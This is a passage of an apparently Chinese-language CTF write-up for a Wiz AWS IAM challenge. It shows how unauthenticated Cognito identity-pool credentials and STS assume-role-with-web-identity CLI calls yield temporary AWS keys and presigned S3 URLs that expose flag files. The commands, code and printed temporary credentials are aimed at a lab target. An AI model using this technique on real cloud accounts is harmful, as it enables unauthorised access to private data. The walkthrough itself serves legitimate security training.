class="property">config</span>.<span class="property">credentials</span> = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title class_">CognitoIdentityCredentials</span>(&#123;<span class="title class_">IdentityPoolId</span>: <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">credentials</span>.<span class="title function_">get</span>(</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span>(<span class="params">err</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(!err) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> accessKeyId = <span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">credentials</span>.<span class="property">accessKeyId</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> secretAccessKey = <span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">credentials</span>.<span class="property">secretAccessKey</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> sessionToken = <span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">credentials</span>.<span class="property">sessionToken</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">accessS3</span>(accessKeyId, secretAccessKey, sessionToken);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error: get key information failed&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        )</span></span><br><span class="line"><span class="language-javascript">               </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">accessS3</span>(<span class="params">accessKeyId, secretAccessKey, sessionToken</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> s3 = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title function_">S3</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                    accessKeyId,</span></span><br><span class="line"><span class="language-javascript">                    secretAccessKey,</span></span><br><span class="line"><span class="language-javascript">                    sessionToken</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            );</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> params = &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title class_">Bucket</span>: <span class="string">&#x27;wiz-privatefiles&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//预签名getSignedUrl是AWS s3存储桶提供的一种机制，允许临时访问AWS s3存储中的对象，而无需公开共享完整的AWS凭证，通过生成一个带有签名的url供访客访问</span></span></span><br><span class="line"><span class="language-javascript">            s3.<span class="title function_">getSignedUrl</span>(<span class="string">&#x27;listObjectsV2&#x27;</span>, params, <span class="keyword">function</span>(<span class="params">err, data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (!err) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// S3存储桶列表获取成功</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// S3存储桶列表获取失败</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error listing S3 buckets: &#x27;</span> + err);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开网页后在前端开发者工具控制台中输出预签名<code>URL</code></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>//wiz-privatefiles.s<span class="number">3</span>.amazonaws.com/?AWSAccessKeyId<span class="operator">=</span>ASIARK<span class="number">7</span>LBOHXN<span class="number">5</span>N<span class="number">23</span>M<span class="number">2</span>N&amp;Expires<span class="operator">=</span><span class="number">1742280145</span>&amp;Signature<span class="operator">=</span>Tt<span class="number">5</span>eDLkyNT<span class="number">0</span>cs<span class="number">6</span>fKjVCTAFke<span class="variable">%2</span>B<span class="number">94</span><span class="variable">%3</span>D&amp;list-<span class="keyword">type</span><span class="operator">=</span><span class="number">2</span>&amp;<span class="keyword">x</span>-amz-security-<span class="type">token</span><span class="operator">=</span>IQoJb<span class="number">3</span>JpZ<span class="number">2</span>luX<span class="number">2</span>VjEP<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="variable">%2</span>FwEaCXVzLWVhc<span class="number">3</span>QtMSJGMEQCIG<span class="variable">%2</span>BR<span class="number">19</span>DlkX<span class="number">2</span>jhX<span class="variable">%2</span>FWewfTBw<span class="number">766</span>X<span class="number">5</span>NXP<span class="number">61</span>WfIT<span class="number">5</span>d<span class="number">9</span>SDGH<span class="number">7</span>AiBBPga<span class="number">1</span>Xjygl<span class="number">7</span>h<span class="number">6</span>bw<span class="variable">%2</span>FSPy<span class="number">2</span>VER<span class="number">7</span>C<span class="number">6</span>YPINRIUpD<span class="number">4</span>zIwoFGiqwBQhYEAAaDDA<span class="number">5</span>MjI<span class="number">5</span>Nzg<span class="number">1</span>MTM<span class="number">3</span>NCIMKOugqVUe<span class="number">7</span>q<span class="number">5</span>mYeAcKo<span class="number">0</span>F<span class="number">9</span>DWLmj<span class="variable">%2</span>FaFlB<span class="number">728</span>QsQwPHXL<span class="number">39</span>Knq<span class="number">3</span>TghteZknLB<span class="number">43</span>lUtWxUei<span class="number">12</span>XDjVQ<span class="number">6</span>QDZHdshSEXj<span class="number">9</span>k<span class="number">24</span>bFx<span class="number">7</span><span class="keyword">x</span><span class="number">8</span>zlWGGP<span class="number">5</span>a<span class="number">67</span>GR<span class="number">60</span>fZfT<span class="number">4</span>nNtubx<span class="number">9</span>uy<span class="number">757</span>bASPkTgCbHSl<span class="number">6</span>cQdJ<span class="number">8</span>UGpkGPOLV<span class="variable">%2</span>ByH<span class="number">8</span>yXfl<span class="number">6</span>fwMOpDpq<span class="variable">%2</span>BGXLKN<span class="variable">%2</span>BEE<span class="number">1</span>iroeYkvAKSgS<span class="number">9</span>Fg<span class="number">850</span>ij<span class="number">7</span>ndR<span class="number">93</span>lxkQIHq<span class="number">9</span>QmhH<span class="number">629</span>tDmOgMO<span class="number">6</span>H<span class="number">9</span>pjJBHRc<span class="number">4</span>dEfRqmZw<span class="number">9</span>cN<span class="number">0</span>FMmnanP<span class="number">7</span>s<span class="number">5</span>JtXNtn<span class="number">1</span>xvPF<span class="number">6</span>p<span class="number">4</span>wJ<span class="number">9</span>mWqbou<span class="number">6</span>mEx<span class="number">7</span>L<span class="number">3</span>Bq<span class="number">9</span>nZHMLYLJ<span class="number">62</span>mDbfLxfmfa<span class="number">9</span>ai<span class="number">6</span>Yjug<span class="variable">%2</span>BzgZteAnVZiRy<span class="number">0</span>Pnezd<span class="number">4</span>AzM<span class="number">7</span>NAeE<span class="number">4</span>ajrGqs<span class="number">0</span>oBq<span class="number">0</span>hCs<span class="number">1</span>khTnCgngoXNuqhCBo<span class="number">4</span>kCtMXIQoy<span class="number">4</span>nltOKDylG<span class="number">6</span>k<span class="number">3</span>Yy<span class="number">8</span>ZfXM<span class="number">9</span>fkz<span class="variable">%2</span>B<span class="number">7</span>w<span class="number">7</span>fd<span class="number">8</span>CG<span class="number">8</span>el<span class="number">3</span>gOYkwPdxFj<span class="number">6</span>j<span class="number">1</span>ggoQo<span class="number">2</span>Q<span class="number">2</span>dPUfibaou<span class="number">6</span>PhGbL<span class="number">0</span>yFADCZD<span class="number">746</span>z<span class="variable">%2</span>BdDf<span class="number">1</span>utiBR<span class="number">6</span>RHAFtWFA<span class="number">3</span>hdU<span class="variable">%2</span>B<span class="number">3</span>xZ<span class="number">2</span>YmXoMcS<span class="variable">%2</span>FTEvAGIf<span class="number">69</span>RWoqGE<span class="number">0</span>Wr<span class="variable">%2</span>B<span class="number">8e0</span>b<span class="variable">%2</span>BzGCJCHsmz<span class="variable">%2</span>F<span class="number">4</span>gO<span class="variable">%2</span>FZrdvZw<span class="variable">%2</span>FcJU<span class="number">21</span>I<span class="number">6</span>paBaX<span class="variable">%2</span>BJfaOLWgO<span class="number">6</span>rucXHNbcJjNcY<span class="number">2</span>sZnqV<span class="number">4</span>Rjp<span class="number">8</span>KleXAdY<span class="number">9</span>DTmXN<span class="number">6</span>bSMhuBFXKWM<span class="number">2</span>PBGo<span class="variable">%2</span>FJKcKaZGGVCVVq<span class="variable">%2</span>BUOw<span class="number">2</span>PpKjkmz<span class="variable">%2</span>B<span class="number">2</span><span class="variable">%2</span>BUTlXvAcrjqK<span class="number">8</span>HhzNNX<span class="number">0</span>mRXeWaViwRmu<span class="number">5</span>MrtbA<span class="number">6</span><span class="variable">%2</span>BsCMtUi<span class="number">5</span>xlcJh<span class="number">7E1</span>gqAyV<span class="number">8</span>jEgFRqpYuQvZP<span class="variable">%2</span>FNURk<span class="number">3</span>YiolCKFnvePkQRI<span class="number">0</span>sKO<span class="number">042</span>S<span class="number">8</span>MBflYK<span class="number">3</span>ehuF<span class="number">15</span>QsWTDF<span class="number">5</span>rbyHIO<span class="number">1</span>sePxFXUmJ<span class="number">3</span>zT<span class="number">2</span>Yyk<span class="number">7</span>tHiyJp<span class="number">0</span>QmFDlA<span class="variable">%2</span>Fg<span class="variable">%2</span>BHF<span class="number">84</span>qNb<span class="number">8</span>ssNDxjdU<span class="number">8</span>pRanuG<span class="number">94</span>mp<span class="variable">%2</span>FifPSl<span class="number">1</span>hHRqse<span class="number">6</span>joALc<span class="variable">%2</span>FBdJR<span class="number">8</span>zi<span class="number">3</span>BkrhXZUwzaTkvgY<span class="number">63</span>wI<span class="number">8</span>B<span class="number">4</span>Ub<span class="variable">%2</span>FesyQPciUdSgOpUwHaQb<span class="number">2</span>g<span class="number">4</span>R<span class="number">9</span>iCVhM<span class="number">5</span>uBtYdBQt<span class="number">8</span>Yohw<span class="number">4</span>L<span class="number">2</span>COukugU<span class="number">6</span>VuGcZDyyJ<span class="variable">%2</span>FIEcHjgJCcgCZfZLownrSB<span class="number">2</span><span class="variable">%2</span>BFPdvZy<span class="number">4</span>YZw<span class="number">5</span>h<span class="number">9</span>wmbYXbmrt<span class="number">8</span>ANCkDSQ<span class="number">5</span>JeYews<span class="number">0</span>iy<span class="number">1</span>fme<span class="variable">%2</span>FXNXZZQRmyIUQn<span class="variable">%2</span>FO<span class="number">3</span>gKw<span class="number">6E9</span>quI<span class="number">1</span>mmbK<span class="number">56</span>qHhyuqQefumwZVGELeaVfJL<span class="number">9</span>Fr<span class="number">9</span>BLcqx<span class="number">4</span>BxemUam<span class="number">7</span>Gryu<span class="number">6</span>xg<span class="number">23</span>ZrL<span class="number">0</span>sHbvGEKAWlqztsQAan<span class="number">2</span>ExHSsa<span class="variable">%2</span>BqvMe<span class="number">1</span>mqh<span class="number">4</span><span class="variable">%2</span>FgICO<span class="number">9</span>wA<span class="number">9</span>t<span class="number">8</span>qhVphSP<span class="number">0</span>dDd<span class="number">9</span>eAlaqPZX<span class="number">8</span>TiBRTd<span class="number">8</span>yCeHpY<span class="number">1</span>l<span class="number">2</span>Q<span class="number">4</span>t<span class="number">9</span>YPYZD<span class="number">5</span>YXxx<span class="number">96</span>X<span class="number">41</span>Vf<span class="number">7</span>UPjr<span class="number">4</span>vpOKmVcU<span class="number">2</span>za<span class="variable">%2</span>FdlyhlI<span class="number">5</span>dUUuEcyY<span class="number">8</span>U<span class="number">7</span>WUlZ<span class="number">5</span>VJHL<span class="number">6</span>bvTnD<span class="number">4</span>JUmTPRsE<span class="number">84</span>yRGA<span class="number">4</span>Rtr<span class="number">2</span>aRJfdFJ<span class="number">1</span>pUXnwim<span class="variable">%2</span>FQa<span class="number">7</span>GZrS<span class="number">4</span>ZFj<span class="number">3</span>SsznAumhUL<span class="variable">%2</span>B<span class="number">9</span>qYjgr<span class="variable">%2</span>FmDRGzZdokwZMDQnYxxJXE<span class="variable">%2</span>Fk<span class="variable">%3</span>D</span><br></pre></td></tr></table></figure>

<p>访问执行<code>listObjects</code>操作，可以获得<code>Key</code>值为<code>flag1.txt</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ListBucketResult</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://s3.amazonaws.com/doc/2006-03-01/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Name</span>&gt;</span>wiz-privatefiles<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Prefix</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">KeyCount</span>&gt;</span>2<span class="tag">&lt;/<span class="name">KeyCount</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">MaxKeys</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">MaxKeys</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IsTruncated</span>&gt;</span>false<span class="tag">&lt;/<span class="name">IsTruncated</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>cognito1.png<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2023-06-05T19:42:27.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;539693e3b6f41aa7545e9f8965c3cadd&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>4220<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>flag1.txt<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2023-06-05T13:28:35.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;20fcd58d8bdd4d81814b501230a94727&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>37<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ListBucketResult</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>修改脚本，利用<code>getObject</code>访问<code>flag.txt</code>即可拿到<code>flag</code></p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> params = &#123;</span><br><span class="line">                <span class="attr">Bucket</span>: <span class="string">&#x27;wiz-privatefiles&#x27;</span>,</span><br><span class="line">                <span class="attr">Key</span>: <span class="string">&#x27;flag1.txt&#x27;</span>   <span class="comment">//Key值</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//预签名getSignedUrl是AWS s3存储桶提供的一种机制，允许临时访问AWS s3存储中的对象，而无需公开共享完整的AWS凭证，通过生成一个带有签名的url供访客访问</span></span><br><span class="line">            s3.getSignedUrl(<span class="string">&#x27;getObject&#x27;</span>, params, <span class="keyword">function</span>(<span class="params">err, data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!err) &#123;</span><br><span class="line">                    <span class="comment">// S3存储桶列表获取成功</span></span><br><span class="line">                    <span class="built_in">console</span>.<span class="built_in">log</span>(data);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// S3存储桶列表获取失败</span></span><br><span class="line">                    <span class="built_in">console</span>.error(<span class="string">&#x27;Error listing S3 buckets: &#x27;</span> + err);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        </span><br><span class="line">&#123;<span class="attr">wiz</span>:incognito-is-always-suspicious&#125;</span><br></pre></td></tr></table></figure>



<h4 id="One-final-push"><a href="#One-final-push" class="headerlink" title="One final push"></a>One final push</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;Federated&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cognito-identity.amazonaws.com&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;cognito-identity.amazonaws.com:aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>问了下<code>GPT</code>，使用<code>AssumeRoleWithWebIdentity</code>生成<code>STS</code>临时凭证的方法必须最少需要三个参数</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">RoleArn：</span><br><span class="line">描述：指定你要承担的角色的Amazon Resource <span class="type">Name</span> (ARN)。</span><br><span class="line">类型：字符串</span><br><span class="line">示例：&quot;arn:aws:iam::123456789012:role/YourRoleName&quot;</span><br><span class="line">RoleSessionName：</span><br><span class="line">描述：为会话指定一个名称。这个名称将在生成的临时凭证中显示，并且可以帮助你识别特定的会话。</span><br><span class="line">类型：字符串</span><br><span class="line">示例：&quot;user-session-123&quot;</span><br><span class="line">WebIdentityToken：</span><br><span class="line">描述：由身份提供商（IdP）签发的OAuth <span class="number">2.0</span>访问令牌或OpenID <span class="keyword">Connect</span> ID令牌。</span><br><span class="line">类型：字符串</span><br><span class="line">示例：&quot;your-web-identity-token&quot;</span><br></pre></td></tr></table></figure>

<p>题目中已经给了<code>RoleArn</code>-&gt;<code>arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role</code></p>
<p><code>RoleSessionName</code>可以自定义</p>
<p><code>WebIdentity</code>需要通过身份池<code>Id</code>来获取</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250318151743968.png" alt="image-20250318151743968"></p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">根据<span class="string">AWS</span>文档可知，题目给出的<span class="string">IAM</span>策略中的<span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span>即为身份池<span class="string">ID</span>，通过身份池<span class="string">ID</span>即可获取 - <span class="string">IdentityId</span></span><br><span class="line">&gt; <span class="string">aws</span> <span class="string">cognito-identity</span> <span class="built_in">get-id</span> <span class="built_in">--identity-pool-id</span> <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;IdentityId&quot;</span>: <span class="string">&quot;us-east-1:157d6171-ee41-cfb4-c468-23b03dc4ee06&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">通过 <span class="string">IdentityID</span> 获取 <span class="string">WebIdentityToken</span></span><br><span class="line">&gt; <span class="string">aws</span> <span class="string">cognito-identity</span> <span class="built_in">get-open-id-token</span> <span class="built_in">--identity-id</span> <span class="string">&quot;us-east-1:157d6171-ee41-cfb4-c468-23b03dc4ee06&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;IdentityId&quot;</span>: <span class="string">&quot;us-east-1:157d6171-ee41-cfb4-c468-23b03dc4ee06&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Token&quot;</span>: <span class="string">&quot;eyJraWQiOiJ1cy1lYXN0LTEtNyIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWU0MS1jZmI0LWM0NjgtMjNiMDNkYzRlZTA2IiwiYXV</span></span><br><span class="line"><span class="string">kIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3</span></span><br><span class="line"><span class="string">cy5jb20iLCJleHAiOjE3NDIyODMxNDYsImlhdCI6MTc0MjI4MjU0Nn0.QOJoQ3eu9474sl9-5Fw6X-NP8Rv8R0C70Ee6bVyeCAPY_AFYCt4BMNXa5CIpS7jB6J2dCcgqvD765fOTrL8Ukq5SQAIRfrsEEMYtB</span></span><br><span class="line"><span class="string">iw-gmekfAAidfMaiYYpkK4ZBCT8cMWv_slZaawYAbPastTgq-2mS2da_PpFQl71TLHNK7wJCtkoIiBCscGYj9BO6-Og0p1kykAOOEfYejKg0gpWwR1sU21j4lASNzhCq0GHKOVhZkDji15fKlSAJrG25Gek8R</span></span><br><span class="line"><span class="string">KWJaAE8-RHbvdPCkNg-nYyFaJjjc_yi684m70zyaQn8wwVLeumCeokaNAR52ItGb9dDFL4S2ztFh3xtC24Ww&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">集齐<span class="title class_">RoleArn</span>, <span class="title class_">RoleSessionName</span>(自定义), <span class="title class_">WebIdentityToken</span>，可以创建<span class="title class_">STS</span>临时凭证了</span><br><span class="line">&gt; aws sts assume-role-<span class="keyword">with</span>-web-identity --role-arn <span class="symbol">arn:</span><span class="symbol">aws:</span>iam::<span class="number">092297851374</span><span class="symbol">:role/Cognito_s3accessAuth_Role</span> --role-session-name <span class="title class_">KaGty1</span> --web-identity-token e</span><br><span class="line">yJraWQiOiJ1cy1lYXN0LTEtNyIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWU0MS1jZmI0LWM0NjgtMjNiMDNkYzRlZTA2IiwiYXVkIjoidXMtZWFzdC</span><br><span class="line"><span class="number">0</span>xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHA</span><br><span class="line">iOjE3NDIyODQxMTYsImlhdCI6MTc0MjI4MzUxNn0.<span class="title class_">YveKwdts_x5venx8zvGU6dHfSDFccQTuZKc_2sIhWRvDEGLg6FUDPgJTg0vpEAtnjrhdTY5EAN2vYC0llmVYi_VoLngMf6j</span>-b5nyYxZ8ZVhIcjmYzwwv</span><br><span class="line"><span class="title class_">CBjY3f7s7</span>-jv78AsJvKPgL1omsYvt30rqhZ8Bz_0IsDnBqUGUe31-k8Zn2P9og6RmI051Y934VAI1VrnK23EBThTsj9M2q69Ufi-<span class="title class_">DJFeKxEl_AFbcAHKMdlLz2gSyNxch6BpTv5vTANjmuriVnXrKRtRsFRF4</span></span><br><span class="line"><span class="title class_">EflfG_j2fi9d5d8hKElsailh5gQphwByM</span>-kTA8BJGMVbX-<span class="title class_">Kf</span>-<span class="title class_">AuuvT3VMmU1e</span>-<span class="title class_">WVn3d</span>-Q</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Credentials&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;AccessKeyId&quot;</span>: <span class="string">&quot;ASIARK7LBOHXPIVL6P5P&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SecretAccessKey&quot;</span>: <span class="string">&quot;NWfYfwc1DRYHtEcdthr0fNZEU/Qb+wKnWA0hfn5i&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SessionToken&quot;</span>: <span class="string">&quot;FwoGZXIvYXdzEBEaDM2rTSyqBHeCOxvZryKeAutj/w1mFE+7tE9DjXKqPlkImeoON8mj3jujAr6rzZY7WRFlRU+GpfKVoe9o4iXiPPonW+QtjvYLGHNZ+lJ0fPZwJLFgZlLL</span></span><br><span class="line"><span 